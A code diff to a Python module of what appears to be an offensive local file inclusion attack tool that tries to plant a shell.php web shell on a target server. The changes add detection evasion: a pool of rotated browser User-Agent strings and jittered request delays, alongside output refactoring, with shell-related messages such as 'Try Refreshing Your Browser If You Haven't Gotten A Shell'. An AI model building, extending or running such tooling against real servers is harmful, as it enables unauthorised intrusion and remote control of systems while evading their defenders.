@@ -1,4 +1,6 @@
 import sys
+import time
+import random
 from os.path import dirname, abspath, join
 from shutil import copy2
 import requests
@@ -10,6 +12,21 @@ HERE = dirname(abspath(__file__))
 SHELL = join(HERE, "shell.php")
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+# User-Agent rotation pool
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+]
+
+# Rate limiting configuration
+RATE_LIMIT_DELAY = 0.1  # Default delay between requests in seconds
 
 
 class listener:
@@ -91,6 +108,19 @@ def parse_post_data(data_string):
     return data
 
 
+def get_random_user_agent():
+    """Get a random User-Agent from the pool"""
+    return random.choice(USER_AGENTS)
+
+
+def apply_rate_limit(delay=None):
+    """Apply rate limiting delay between requests"""
+    if delay is None:
+        delay = RATE_LIMIT_DELAY
+    if delay > 0:
+        time.sleep(delay + random.uniform(0, 0.1))  # Add small random jitter
+
+
 def attack(
     target,
     location,
@@ -105,6 +135,8 @@ def attack(
     method="GET",
     post_data=None,
     custom_headers=None,
+    rate_limit=True,
+    user_agent_rotation=True,
 ):
     """Perform specified type of LFI attack
 
@@ -130,9 +162,16 @@ def attack(
 
     # Add User-Agent if not specified
     if "User-Agent" not in request_headers:
-        request_headers["User-Agent"] = (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        )
+        if user_agent_rotation:
+            request_headers["User-Agent"] = get_random_user_agent()
+        else:
+            request_headers["User-Agent"] = (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            )
+
+    # Apply rate limiting before making requests
+    if rate_limit:
+        apply_rate_limit()
 
     try:
         if dt:
@@ -171,7 +210,9 @@ def attack(
             )
 
         if response.status_code != 200:
-            print(colors("[!] Unexpected HTTP Response ", 91))
+            from .rich_output import print_error
+
+            print_error("[!] Unexpected HTTP Response")
             sys.exit(1)
         if not relative:
             if method.upper() == "POST":
@@ -192,14 +233,15 @@ def attack(
 
             if r.status_code != 200:
                 if not detection_mode:
-                    print(colors("[!] Unexpected HTTP Response ", 91))
+                    from .rich_output import print_error
+
+                    print_error("[!] Unexpected HTTP Response")
             else:
                 if not detection_mode:
-                    print(
-                        colors(
-                            "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ",
-                            91,
-                        )
+                    from .rich_output import print_error
+
+                    print_error(
+                        "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell"
                     )
 
         else:
@@ -230,18 +272,21 @@ def attack(
                         )
 
                     if r.status_code != 200:
-                        print(colors("[!] Unexpected HTTP Response ", 91))
+                        from .rich_output import print_error
+
+                        print_error("[!] Unexpected HTTP Response")
             if not detection_mode:
-                print(
-                    colors(
-                        "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ",
-                        91,
-                    )
+                from .rich_output import print_error
+
+                print_error(
+                    "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell"
                 )
 
         return response
 
     except Exception as e:
-        print(colors("[!] HTTP Error", 91))
-        print(e)
+        from .rich_output import print_error
+
+        print_error("[!] HTTP Error")
+        print_error(str(e))
         sys.exit(1)
